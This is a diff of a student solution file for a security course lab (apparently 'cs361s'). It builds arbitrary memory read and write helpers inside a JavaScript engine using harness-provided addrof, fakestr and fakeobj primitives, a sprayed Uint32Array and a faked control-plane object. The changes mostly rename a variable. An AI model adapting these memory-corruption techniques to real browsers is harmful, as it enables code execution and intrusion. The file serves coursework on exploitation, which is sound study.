@@ -1,8 +1,8 @@
 /*
  * TODO: Part B solution goes here!
  */
-let dataPlane = new Uint32Array(1);
-let fakestring = cs361s.fakestr(cs361s.addrof("\x01\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00") + 16);
+let dataplane = new Uint32Array(1);
+let fakestring = cs361s.fakestr(cs361s.addrof("\x01\x00\x00\x00\x00\x00\x00\x01\x00\x00") + 16);
 
 let originarray = new Uint32Array(72);
 while (cs361s.addrof(originarray) < cs361s.addrof(fakestring) || cs361s.addrof(originarray) > cs361s.addrof(fakestring) - 72 + 16 + 10000000) {
@@ -22,7 +22,7 @@ while(index < codes.length){
 var fb = 0;
 while(fb < 8) {
     var bit = 0;
-    let temp = cs361s.addrof(dataPlane);
+    let temp = cs361s.addrof(dataplane);
     while(bit < fb) {
         temp = (temp - codes[72 - 16 + bit])/256;
         bit++;
@@ -44,12 +44,12 @@ let editmem = function(addr) {
 
 let readmem = function(addr) {
     editmem(addr);
-    return dataPlane[0];
+    return dataplane[0];
 };
 
 let writemem = function(addr, val) {
     editmem(addr);
-    dataPlane[0] = val;
+    dataplane[0] = val;
 };
 
 
@@ -62,12 +62,12 @@ let controlPlane = cs361s.fakeobj(cs361s.addrof(String.fromCharCode(...codes)) +
 let readmem = function(addr) {
     controlPlane[14] = addr % (Math.pow(2, 32));
     controlPlane[15] = (addr - controlPlane[0]) / (Math.pow(2, 32));
-    return dataPlane[0];
+    return dataplane[0];
 };
 
 let writemem = function(addr, val) {
     controlPlane[14] = addr % (Math.pow(2, 32));
     controlPlane[15] = (addr - controlPlane[0]) / (Math.pow(2, 32));
-    dataPlane[0] = val;
+    dataplane[0] = val;
 };
 */
